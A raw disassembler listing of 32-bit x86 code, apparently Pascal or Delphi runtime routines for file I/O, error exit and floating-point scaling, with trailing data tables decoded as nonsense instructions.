  403c8e:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
  403c94:	74 f7                	je     0x403c8d
  403c96:	b8 67 00 00 00       	mov    $0x67,%eax
  403c9b:	e9 d4 e9 ff ff       	jmp    0x402674
  403ca0:	8b 50 04             	mov    0x4(%eax),%edx
  403ca3:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403ca9:	75 08                	jne    0x403cb3
  403cab:	ff 50 20             	call   *0x20(%eax)
  403cae:	85 c0                	test   %eax,%eax
  403cb0:	75 0e                	jne    0x403cc0
  403cb2:	c3                   	ret
  403cb3:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
  403cb9:	74 f7                	je     0x403cb2
  403cbb:	b8 67 00 00 00       	mov    $0x67,%eax
  403cc0:	e9 af e9 ff ff       	jmp    0x402674
  403cc5:	8d 40 00             	lea    0x0(%eax),%eax
  403cc8:	53                   	push   %ebx
  403cc9:	8b d8                	mov    %eax,%ebx
  403ccb:	8b 50 04             	mov    0x4(%eax),%edx
  403cce:	81 ea b1 d7 00 00    	sub    $0xd7b1,%edx
  403cd4:	74 0e                	je     0x403ce4
  403cd6:	83 fa 02             	cmp    $0x2,%edx
  403cd9:	77 19                	ja     0x403cf4
  403cdb:	ff 50 1c             	call   *0x1c(%eax)
  403cde:	85 c0                	test   %eax,%eax
  403ce0:	75 0b                	jne    0x403ced
  403ce2:	8b c3                	mov    %ebx,%eax
  403ce4:	ff 53 24             	call   *0x24(%ebx)
  403ce7:	85 c0                	test   %eax,%eax
  403ce9:	75 02                	jne    0x403ced
  403ceb:	5b                   	pop    %ebx
  403cec:	c3                   	ret
  403ced:	e8 82 e9 ff ff       	call   0x402674
  403cf2:	eb f7                	jmp    0x403ceb
  403cf4:	3d 38 c0 40 00       	cmp    $0x40c038,%eax
  403cf9:	74 f0                	je     0x403ceb
  403cfb:	b8 67 00 00 00       	mov    $0x67,%eax
  403d00:	eb eb                	jmp    0x403ced
  403d02:	8b c0                	mov    %eax,%eax
  403d04:	a3 20 c0 40 00       	mov    %eax,0x40c020
  403d09:	80 3d 30 c0 40 00 00 	cmpb   $0x0,0x40c030
  403d10:	74 17                	je     0x403d29
  403d12:	80 3d 14 c4 40 00 01 	cmpb   $0x1,0x40c414
  403d19:	0f 82 c0 00 00 00    	jb     0x403ddf
  403d1f:	74 08                	je     0x403d29
  403d21:	0b c0                	or     %eax,%eax
  403d23:	0f 84 c1 00 00 00    	je     0x403dea
  403d29:	a1 24 c0 40 00       	mov    0x40c024,%eax
  403d2e:	0b c0                	or     %eax,%eax
  403d30:	74 0c                	je     0x403d3e
  403d32:	33 d2                	xor    %edx,%edx
  403d34:	89 15 24 c0 40 00    	mov    %edx,0x40c024
  403d3a:	ff d0                	call   *%eax
  403d3c:	eb eb                	jmp    0x403d29
  403d3e:	83 3d 28 c0 40 00 00 	cmpl   $0x0,0x40c028
  403d45:	74 71                	je     0x403db8
  403d47:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403d4c:	bb 24 b0 40 00       	mov    $0x40b024,%ebx
  403d51:	b9 0a 00 00 00       	mov    $0xa,%ecx
  403d56:	33 d2                	xor    %edx,%edx
  403d58:	f7 f1                	div    %ecx
  403d5a:	80 c2 30             	add    $0x30,%dl
  403d5d:	88 13                	mov    %dl,(%ebx)
  403d5f:	4b                   	dec    %ebx
  403d60:	85 c0                	test   %eax,%eax
  403d62:	75 f2                	jne    0x403d56
  403d64:	bb 30 b0 40 00       	mov    $0x40b030,%ebx
  403d69:	a1 28 c0 40 00       	mov    0x40c028,%eax
  403d6e:	2d 78 11 40 00       	sub    $0x401178,%eax
  403d73:	8b d0                	mov    %eax,%edx
  403d75:	83 e2 0f             	and    $0xf,%edx
  403d78:	8a 92 1c 3e 40 00    	mov    0x403e1c(%edx),%dl
  403d7e:	88 13                	mov    %dl,(%ebx)
  403d80:	4b                   	dec    %ebx
  403d81:	c1 e8 04             	shr    $0x4,%eax
  403d84:	75 ed                	jne    0x403d73
  403d86:	80 3d 31 c0 40 00 00 	cmpb   $0x0,0x40c031
  403d8d:	75 15                	jne    0x403da4
  403d8f:	6a 00                	push   $0x0
  403d91:	68 32 b0 40 00       	push   $0x40b032
  403d96:	68 14 b0 40 00       	push   $0x40b014
  403d9b:	6a 00                	push   $0x0
  403d9d:	e8 12 d4 ff ff       	call   0x4011b4
  403da2:	eb 14                	jmp    0x403db8
  403da4:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  403da9:	ba 14 b0 40 00       	mov    $0x40b014,%edx
  403dae:	e8 31 02 00 00       	call   0x403fe4
  403db3:	e8 af 01 00 00       	call   0x403f67
  403db8:	b8 38 c0 40 00       	mov    $0x40c038,%eax
  403dbd:	e8 06 ff ff ff       	call   0x403cc8
  403dc2:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  403dc7:	e8 fc fe ff ff       	call   0x403cc8
  403dcc:	e8 0b dc ff ff       	call   0x4019dc
  403dd1:	80 3d 14 c4 40 00 00 	cmpb   $0x0,0x40c414
  403dd8:	75 10                	jne    0x403dea
  403dda:	e8 d5 f2 ff ff       	call   0x4030b4
  403ddf:	ff 35 20 c0 40 00    	push   0x40c020
  403de5:	e8 a2 d3 ff ff       	call   0x40118c
  403dea:	e8 c5 f2 ff ff       	call   0x4030b4
  403def:	c6 05 14 c4 40 00 00 	movb   $0x0,0x40c414
  403df6:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403dfb:	f7 d8                	neg    %eax
  403dfd:	1b c0                	sbb    %eax,%eax
  403dff:	40                   	inc    %eax
  403e00:	8b 3d 10 c4 40 00    	mov    0x40c410,%edi
  403e06:	8b 35 0c c4 40 00    	mov    0x40c40c,%esi
  403e0c:	8b 1d 08 c4 40 00    	mov    0x40c408,%ebx
  403e12:	8b 2d 04 c4 40 00    	mov    0x40c404,%ebp
  403e18:	c9                   	leave
  403e19:	c2 0c 00             	ret    $0xc
  403e1c:	30 31                	xor    %dh,(%ecx)
  403e1e:	32 33                	xor    (%ebx),%dh
  403e20:	34 35                	xor    $0x35,%al
  403e22:	36 37                	ss aaa
  403e24:	38 39                	cmp    %bh,(%ecx)
  403e26:	41                   	inc    %ecx
  403e27:	42                   	inc    %edx
  403e28:	43                   	inc    %ebx
  403e29:	44                   	inc    %esp
  403e2a:	45                   	inc    %ebp
  403e2b:	46                   	inc    %esi
  403e2c:	33 c0                	xor    %eax,%eax
  403e2e:	eb 00                	jmp    0x403e30
  403e30:	33 d2                	xor    %edx,%edx
  403e32:	89 15 28 c0 40 00    	mov    %edx,0x40c028
  403e38:	e9 c7 fe ff ff       	jmp    0x403d04
  403e3d:	33 c0                	xor    %eax,%eax
  403e3f:	eb 00                	jmp    0x403e41
  403e41:	8f 05 28 c0 40 00    	pop    0x40c028
  403e47:	e9 b8 fe ff ff       	jmp    0x403d04
  403e4c:	53                   	push   %ebx
  403e4d:	56                   	push   %esi
  403e4e:	8b f0                	mov    %eax,%esi
  403e50:	8b da                	mov    %edx,%ebx
  403e52:	8b 56 04             	mov    0x4(%esi),%edx
  403e55:	81 ea b0 d7 00 00    	sub    $0xd7b0,%edx
  403e5b:	74 0a                	je     0x403e67
  403e5d:	83 fa 03             	cmp    $0x3,%edx
  403e60:	77 19                	ja     0x403e7b
  403e62:	e8 61 fe ff ff       	call   0x403cc8
  403e67:	8b c6                	mov    %esi,%eax
  403e69:	89 5e 04             	mov    %ebx,0x4(%esi)
  403e6c:	ff 56 18             	call   *0x18(%esi)
  403e6f:	85 c0                	test   %eax,%eax
  403e71:	74 05                	je     0x403e78
  403e73:	e8 fc e7 ff ff       	call   0x402674
  403e78:	5e                   	pop    %esi
  403e79:	5b                   	pop    %ebx
  403e7a:	c3                   	ret
  403e7b:	b8 66 00 00 00       	mov    $0x66,%eax
  403e80:	e8 ef e7 ff ff       	call   0x402674
  403e85:	eb f1                	jmp    0x403e78
  403e87:	ba b1 d7 00 00       	mov    $0xd7b1,%edx
  403e8c:	eb be                	jmp    0x403e4c
  403e8e:	ba b2 d7 00 00       	mov    $0xd7b2,%edx
  403e93:	eb b7                	jmp    0x403e4c
  403e95:	ba b3 d7 00 00       	mov    $0xd7b3,%edx
  403e9a:	eb b0                	jmp    0x403e4c
  403e9c:	56                   	push   %esi
  403e9d:	57                   	push   %edi
  403e9e:	8b f2                	mov    %edx,%esi
  403ea0:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403ea7:	75 2e                	jne    0x403ed7
  403ea9:	8b 78 14             	mov    0x14(%eax),%edi
  403eac:	03 78 0c             	add    0xc(%eax),%edi
  403eaf:	8b 50 08             	mov    0x8(%eax),%edx
  403eb2:	2b 50 0c             	sub    0xc(%eax),%edx
  403eb5:	3b d1                	cmp    %ecx,%edx
  403eb7:	7f 16                	jg     0x403ecf
  403eb9:	01 50 0c             	add    %edx,0xc(%eax)
  403ebc:	2b ca                	sub    %edx,%ecx
  403ebe:	50                   	push   %eax
  403ebf:	51                   	push   %ecx
  403ec0:	8b ca                	mov    %edx,%ecx
  403ec2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403ec4:	ff 50 1c             	call   *0x1c(%eax)
  403ec7:	85 c0                	test   %eax,%eax
  403ec9:	75 33                	jne    0x403efe
  403ecb:	59                   	pop    %ecx
  403ecc:	58                   	pop    %eax
  403ecd:	eb da                	jmp    0x403ea9
  403ecf:	01 48 0c             	add    %ecx,0xc(%eax)
  403ed2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403ed4:	5f                   	pop    %edi
  403ed5:	5e                   	pop    %esi
  403ed6:	c3                   	ret
  403ed7:	3d 04 c2 40 00       	cmp    $0x40c204,%eax
  403edc:	75 14                	jne    0x403ef2
  403ede:	51                   	push   %ecx
  403edf:	52                   	push   %edx
  403ee0:	50                   	push   %eax
  403ee1:	e8 a8 ff ff ff       	call   0x403e8e
  403ee6:	58                   	pop    %eax
  403ee7:	5a                   	pop    %edx
  403ee8:	59                   	pop    %ecx
  403ee9:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403ef0:	74 b7                	je     0x403ea9
  403ef2:	b8 69 00 00 00       	mov    $0x69,%eax
  403ef7:	e8 78 e7 ff ff       	call   0x402674
  403efc:	eb d6                	jmp    0x403ed4
  403efe:	e8 71 e7 ff ff       	call   0x402674
  403f03:	59                   	pop    %ecx
  403f04:	58                   	pop    %eax
  403f05:	eb cd                	jmp    0x403ed4
  403f07:	8b ca                	mov    %edx,%ecx
  403f09:	ba 38 b0 40 00       	mov    $0x40b038,%edx
  403f0e:	83 f9 40             	cmp    $0x40,%ecx
  403f11:	7e 21                	jle    0x403f34
  403f13:	83 e9 40             	sub    $0x40,%ecx
  403f16:	50                   	push   %eax
  403f17:	51                   	push   %ecx
  403f18:	b9 40 00 00 00       	mov    $0x40,%ecx
  403f1d:	e8 7a ff ff ff       	call   0x403e9c
  403f22:	e8 2d f2 ff ff       	call   0x403154
  403f27:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  403f2e:	75 0d                	jne    0x403f3d
  403f30:	59                   	pop    %ecx
  403f31:	58                   	pop    %eax
  403f32:	eb d5                	jmp    0x403f09
  403f34:	85 c9                	test   %ecx,%ecx
  403f36:	0f 8f 60 ff ff ff    	jg     0x403e9c
  403f3c:	c3                   	ret
  403f3d:	59                   	pop    %ecx
  403f3e:	58                   	pop    %eax
  403f3f:	c3                   	ret
  403f40:	33 c9                	xor    %ecx,%ecx
  403f42:	8a 0a                	mov    (%edx),%cl
  403f44:	42                   	inc    %edx
  403f45:	e9 52 ff ff ff       	jmp    0x403e9c
  403f4a:	53                   	push   %ebx
  403f4b:	33 db                	xor    %ebx,%ebx
  403f4d:	8a 1a                	mov    (%edx),%bl
  403f4f:	2b cb                	sub    %ebx,%ecx
  403f51:	7e 0b                	jle    0x403f5e
  403f53:	50                   	push   %eax
  403f54:	52                   	push   %edx
  403f55:	8b d1                	mov    %ecx,%edx
  403f57:	e8 ab ff ff ff       	call   0x403f07
  403f5c:	5a                   	pop    %edx
  403f5d:	58                   	pop    %eax
  403f5e:	8b cb                	mov    %ebx,%ecx
  403f60:	5b                   	pop    %ebx
  403f61:	42                   	inc    %edx
  403f62:	e9 35 ff ff ff       	jmp    0x403e9c
  403f67:	ba 78 b0 40 00       	mov    $0x40b078,%edx
  403f6c:	b9 02 00 00 00       	mov    $0x2,%ecx
  403f71:	e8 26 ff ff ff       	call   0x403e9c
  403f76:	e9 25 fd ff ff       	jmp    0x403ca0
  403f7b:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403f82:	75 1e                	jne    0x403fa2
  403f84:	8b 48 0c             	mov    0xc(%eax),%ecx
  403f87:	3b 48 08             	cmp    0x8(%eax),%ecx
  403f8a:	7d 09                	jge    0x403f95
  403f8c:	03 48 14             	add    0x14(%eax),%ecx
  403f8f:	88 11                	mov    %dl,(%ecx)
  403f91:	ff 40 0c             	incl   0xc(%eax)
  403f94:	c3                   	ret
  403f95:	50                   	push   %eax
  403f96:	52                   	push   %edx
  403f97:	ff 50 1c             	call   *0x1c(%eax)
  403f9a:	85 c0                	test   %eax,%eax
  403f9c:	75 27                	jne    0x403fc5
  403f9e:	5a                   	pop    %edx
  403f9f:	58                   	pop    %eax
  403fa0:	eb e2                	jmp    0x403f84
  403fa2:	3d 04 c2 40 00       	cmp    $0x40c204,%eax
  403fa7:	75 12                	jne    0x403fbb
  403fa9:	52                   	push   %edx
  403faa:	50                   	push   %eax
  403fab:	e8 de fe ff ff       	call   0x403e8e
  403fb0:	58                   	pop    %eax
  403fb1:	5a                   	pop    %edx
  403fb2:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403fb9:	74 c9                	je     0x403f84
  403fbb:	b8 69 00 00 00       	mov    $0x69,%eax
  403fc0:	e9 af e6 ff ff       	jmp    0x402674
  403fc5:	e8 aa e6 ff ff       	call   0x402674
  403fca:	5a                   	pop    %edx
  403fcb:	58                   	pop    %eax
  403fcc:	c3                   	ret
  403fcd:	52                   	push   %edx
  403fce:	8d 51 ff             	lea    -0x1(%ecx),%edx
  403fd1:	e8 31 ff ff ff       	call   0x403f07
  403fd6:	8b d4                	mov    %esp,%edx
  403fd8:	b9 01 00 00 00       	mov    $0x1,%ecx
  403fdd:	e8 ba fe ff ff       	call   0x403e9c
  403fe2:	5a                   	pop    %edx
  403fe3:	c3                   	ret
  403fe4:	33 c9                	xor    %ecx,%ecx
  403fe6:	eb 00                	jmp    0x403fe8
  403fe8:	56                   	push   %esi
  403fe9:	57                   	push   %edi
  403fea:	8b f0                	mov    %eax,%esi
  403fec:	51                   	push   %ecx
  403fed:	8b fa                	mov    %edx,%edi
  403fef:	83 c9 ff             	or     $0xffffffff,%ecx
  403ff2:	b0 00                	mov    $0x0,%al
  403ff4:	f2 ae                	repnz scas %es:(%edi),%al
  403ff6:	f7 d1                	not    %ecx
  403ff8:	49                   	dec    %ecx
  403ff9:	8b fa                	mov    %edx,%edi
  403ffb:	5a                   	pop    %edx
  403ffc:	2b d1                	sub    %ecx,%edx
  403ffe:	8b c6                	mov    %esi,%eax
  404000:	51                   	push   %ecx
  404001:	e8 01 ff ff ff       	call   0x403f07
  404006:	59                   	pop    %ecx
  404007:	8b c6                	mov    %esi,%eax
  404009:	8b d7                	mov    %edi,%edx
  40400b:	5f                   	pop    %edi
  40400c:	5e                   	pop    %esi
  40400d:	e9 8a fe ff ff       	jmp    0x403e9c
  404012:	8b c0                	mov    %eax,%eax
  404014:	85 c0                	test   %eax,%eax
  404016:	7c 48                	jl     0x404060
  404018:	74 45                	je     0x40405f
  40401a:	3d 00 14 00 00       	cmp    $0x1400,%eax
  40401f:	0f 8d 7f 00 00 00    	jge    0x4040a4
  404025:	8b d0                	mov    %eax,%edx
  404027:	83 e2 1f             	and    $0x1f,%edx
  40402a:	8d 14 92             	lea    (%edx,%edx,4),%edx
  40402d:	db 2c 55 b8 40 40 00 	fldt   0x4040b8(,%edx,2)
  404034:	de c9                	fmulp  %st,%st(1)
  404036:	c1 e8 05             	shr    $0x5,%eax
  404039:	74 24                	je     0x40405f
  40403b:	8b d0                	mov    %eax,%edx
  40403d:	83 e2 0f             	and    $0xf,%edx
  404040:	74 0c                	je     0x40404e
  404042:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404045:	db 2c 55 ee 41 40 00 	fldt   0x4041ee(,%edx,2)
  40404c:	de c9                	fmulp  %st,%st(1)
  40404e:	c1 e8 04             	shr    $0x4,%eax
  404051:	74 0c                	je     0x40405f
  404053:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404056:	db 2c 45 84 42 40 00 	fldt   0x404284(,%eax,2)
  40405d:	de c9                	fmulp  %st,%st(1)
  40405f:	c3                   	ret
  404060:	f7 d8                	neg    %eax
  404062:	3d 00 14 00 00       	cmp    $0x1400,%eax
  404067:	7d 42                	jge    0x4040ab
  404069:	8b d0                	mov    %eax,%edx
  40406b:	83 e2 1f             	and    $0x1f,%edx
  40406e:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404071:	db 2c 55 b8 40 40 00 	fldt   0x4040b8(,%edx,2)
  404078:	de f9                	fdivrp %st,%st(1)
  40407a:	c1 e8 05             	shr    $0x5,%eax
  40407d:	74 e0                	je     0x40405f
  40407f:	8b d0                	mov    %eax,%edx
  404081:	83 e2 0f             	and    $0xf,%edx
  404084:	74 0c                	je     0x404092
  404086:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404089:	db 2c 55 ee 41 40 00 	fldt   0x4041ee(,%edx,2)
  404090:	de f9                	fdivrp %st,%st(1)
  404092:	c1 e8 04             	shr    $0x4,%eax
  404095:	74 c8                	je     0x40405f
  404097:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40409a:	db 2c 45 84 42 40 00 	fldt   0x404284(,%eax,2)
  4040a1:	de f9                	fdivrp %st,%st(1)
  4040a3:	c3                   	ret
  4040a4:	db 2d ae 40 40 00    	fldt   0x4040ae
  4040aa:	c3                   	ret
  4040ab:	d9 ee                	fldz
  4040ad:	c3                   	ret
  4040ae:	00 00                	add    %al,(%eax)
  4040b0:	00 00                	add    %al,(%eax)
  4040b2:	00 00                	add    %al,(%eax)
  4040b4:	00 80 ff 7f 00 00    	add    %al,0x7fff(%eax)
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	00 00                	add    %al,(%eax)
  4040be:	00 80 ff 3f 00 00    	add    %al,0x3fff(%eax)
  4040c4:	00 00                	add    %al,(%eax)
  4040c6:	00 00                	add    %al,(%eax)
  4040c8:	00 a0 02 40 00 00    	add    %ah,0x4002(%eax)
  4040ce:	00 00                	add    %al,(%eax)
  4040d0:	00 00                	add    %al,(%eax)
  4040d2:	00 c8                	add    %cl,%al
  4040d4:	05 40 00 00 00       	add    $0x40,%eax
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	00 00                	add    %al,(%eax)
  4040dd:	fa                   	cli
  4040de:	08 40 00             	or     %al,0x0(%eax)
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 00                	add    %al,(%eax)
  4040e5:	00 40 9c             	add    %al,-0x64(%eax)
  4040e8:	0c 40                	or     $0x40,%al
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	00 00                	add    %al,(%eax)
  4040ee:	00 00                	add    %al,(%eax)
  4040f0:	50                   	push   %eax
  4040f1:	c3                   	ret
  4040f2:	0f 40 00             	cmovo  (%eax),%eax
  4040f5:	00 00                	add    %al,(%eax)
  4040f7:	00 00                	add    %al,(%eax)
  4040f9:	00 24 f4             	add    %ah,(%esp,%esi,8)
  4040fc:	12 40 00             	adc    0x0(%eax),%al
  4040ff:	00 00                	add    %al,(%eax)
  404101:	00 00                	add    %al,(%eax)
  404103:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	00 20                	add    %ah,(%eax)
  40410e:	bc be 19 40 00       	mov    $0x4019be,%esp
  404113:	00 00                	add    %al,(%eax)
  404115:	00 00                	add    %al,(%eax)
  404117:	28 6b ee             	sub    %ch,-0x12(%ebx)
  40411a:	1c 40                	sbb    $0x40,%al
  40411c:	00 00                	add    %al,(%eax)
  40411e:	00 00                	add    %al,(%eax)
  404120:	00 f9                	add    %bh,%cl
  404122:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  404128:	00 00                	add    %al,(%eax)
  40412a:	40                   	inc    %eax
  40412b:	b7 43                	mov    $0x43,%bh
  40412d:	ba 23 40 00 00       	mov    $0x4023,%edx
  404132:	00 00                	add    %al,(%eax)
  404134:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  40413a:	00 00                	add    %al,(%eax)
  40413c:	00 00                	add    %al,(%eax)
  40413e:	2a e7                	sub    %bh,%ah
  404140:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  404146:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  40414c:	2d 40 00 00 00       	sub    $0x40,%eax
  404151:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  404156:	30 40 00             	xor    %al,0x0(%eax)
  404159:	00 00                	add    %al,(%eax)
  40415b:	04 bf                	add    $0xbf,%al
  40415d:	c9                   	leave
  40415e:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  404164:	00 c5                	add    %al,%ch
  404166:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  40416c:	00 00                	add    %al,(%eax)
  40416e:	40                   	inc    %eax
  40416f:	76 3a                	jbe    0x4041ab
  404171:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  404174:	3a 40 00             	cmp    0x0(%eax),%al
  404177:	00 e8                	add    %ch,%al
  404179:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  40417c:	c7                   	(bad)
  40417d:	8a 3e                	mov    (%esi),%bh
  40417f:	40                   	inc    %eax
  404180:	00 00                	add    %al,(%eax)
  404182:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  404189:	40                   	inc    %eax
  40418a:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  404190:	d7                   	xlat   %ds:(%ebx)
  404191:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  404195:	90                   	nop
  404196:	ac                   	lods   %ds:(%esi),%al
  404197:	6e                   	outsb  %ds:(%esi),(%dx)
  404198:	32 78 86             	xor    -0x7a(%eax),%bh
  40419b:	87 48 40             	xchg   %ecx,0x40(%eax)
  40419e:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  4041a5:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  4041aa:	ed                   	in     (%dx),%eax
  4041ab:	cc                   	int3
  4041ac:	ce                   	into
  4041ad:	1b c2                	sbb    %edx,%eax
  4041af:	d3 4e 40             	rorl   %cl,0x40(%esi)
  4041b2:	a0 84 14 40 61       	mov    0x61401484,%al
  4041b7:	51                   	push   %ecx
  4041b8:	59                   	pop    %ecx
  4041b9:	84 52 40             	test   %dl,0x40(%edx)
  4041bc:	c8 a5 19 90          	enter  $0x19a5,$0x90
  4041c0:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  4041c5:	40                   	inc    %eax
  4041c6:	3a 0f                	cmp    (%edi),%cl
  4041c8:	20 f4                	and    %dh,%ah
  4041ca:	27                   	daa
  4041cb:	8f                   	(bad)
  4041cc:	cb                   	lret
  4041cd:	ce                   	into
  4041ce:	58                   	pop    %eax
  4041cf:	40                   	inc    %eax
  4041d0:	84 09                	test   %cl,(%ecx)
  4041d2:	94                   	xchg   %eax,%esp
  4041d3:	f8                   	clc
  4041d4:	78 39                	js     0x40420f
  4041d6:	3f                   	aas
  4041d7:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  4041de:	d7 
  4041df:	07                   	pop    %es
  4041e0:	8f                   	(bad)
  4041e1:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  4041e6:	67 04 cd             	addr16 add $0xcd,%al
  4041e9:	c9                   	leave
  4041ea:	f2 c9                	repnz leave
  4041ec:	62 40 96             	bound  %eax,-0x6a(%eax)
  4041ef:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  4041f5:	fc                   	cld
  4041f6:	65 40                	gs inc %eax
  4041f8:	9e                   	sahf
  4041f9:	b5 70                	mov    $0x70,%ch
  4041fb:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  404201:	40                   	inc    %eax
  404202:	d5 a6                	aad    $0xa6
  404204:	cf                   	iret
  404205:	ff 49 1f             	decl   0x1f(%ecx)
  404208:	78 c2                	js     0x4041cc
  40420a:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  40420d:	14 9b                	adc    $0x9b,%al
  40420f:	c5 16                	lds    (%esi),%edx
  404211:	ab                   	stos   %eax,%es:(%edi)
  404212:	b3 ef                	mov    $0xef,%bl
  404214:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  404219:	80 c9 47             	or     $0x47,%cl
  40421c:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  404221:	17                   	pop    %ss
  404222:	e6 7f                	out    %al,$0x7f
  404224:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  40422a:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  40422e:	8d                   	lea    (bad),%esi
  40422f:	f7 70 e0             	divl   -0x20(%eax)
  404232:	7c 42                	jl     0x404276
  404234:	30 c9                	xor    %cl,%cl
  404236:	3c e3                	cmp    $0xe3,%al
  404238:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  40423e:	8e de                	mov    %esi,%ds
  404240:	f9                   	stc
  404241:	9d                   	popf
  404242:	fb                   	sti
  404243:	eb 7e                	jmp    0x4042c3
  404245:	aa                   	stos   %al,%es:(%edi)
  404246:	51                   	push   %ecx
  404247:	43                   	inc    %ebx
  404248:	8c 2f                	mov    %gs,(%edi)
  40424a:	6a 5c                	push   $0x5c
  40424c:	19 fc                	sbb    %edi,%esp
  40424e:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  404255:	f2 29 2f             	repnz sub %ebp,(%edi)
  404258:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  40425e:	90                   	nop
  40425f:	db 00                	fildl  (%eax)
  404261:	27                   	daa
  404262:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404263:	9f                   	lahf
  404264:	90                   	nop
  404265:	44                   	inc    %esp
  404266:	17                   	pop    %ss
  404267:	aa                   	stos   %al,%es:(%edi)
  404268:	f8                   	clc
  404269:	ae                   	scas   %es:(%edi),%al
  40426a:	10 e3                	adc    %ah,%bl
  40426c:	c5 c4 fa             	(bad)
  40426f:	44                   	inc    %esp
  404270:	59                   	pop    %ecx
  404271:	9c                   	pushf
  404272:	b0 e9                	mov    $0xe9,%al
  404274:	07                   	pop    %es
  404275:	9c                   	pushf
  404276:	8a f2                	mov    %dl,%dh
  404278:	64 45                	fs inc %ebp
  40427a:	d4 f3                	aam    $0xf3
  40427c:	f7 eb                	imul   %ebx
  40427e:	e1 4a                	loope  0x4042ca
  404280:	7a 95                	jp     0x404217
  404282:	cf                   	iret
  404283:	45                   	inc    %ebp
  404284:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  40428a:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  404290:	0e                   	push   %cs
  404291:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404292:	ae                   	scas   %es:(%edi),%al
  404293:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  404298:	17                   	pop    %ss
  404299:	0c 75                	or     $0x75,%al
  40429b:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  4042a2:	e4 a7 93 
  4042a5:	39 3b                	cmp    %edi,(%ebx)
  4042a7:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  4042ac:	e5 5d                	in     $0x5d,%eax
  4042ae:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  4042b3:	9e                   	sahf
  4042b4:	92                   	xchg   %eax,%edx
  4042b5:	5a                   	pop    %edx
  4042b6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4042b7:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  4042bd:	8c 37                	mov    %?,(%edi)
  4042bf:	61                   	popa
  4042c0:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  4042c3:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  4042c9:	67 f8                	addr16 clc
  4042cb:	f3 27                	repz daa
  4042cd:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  4042d2:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  4042d6:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  4042dc:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  4042e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4042e2:	62 11                	bound  %edx,(%ecx)
  4042e4:	35 ae ca 7b 55       	xor    $0x557bcaae,%eax
  4042e9:	8b ec                	mov    %esp,%ebp
  4042eb:	53                   	push   %ebx
  4042ec:	56                   	push   %esi
  4042ed:	57                   	push   %edi
  4042ee:	33 c0                	xor    %eax,%eax
  4042f0:	55                   	push   %ebp
  4042f1:	68 8a 43 40 00       	push   $0x40438a
  4042f6:	64 ff 30             	push   %fs:(%eax)
  4042f9:	64 89 20             	mov    %esp,%fs:(%eax)
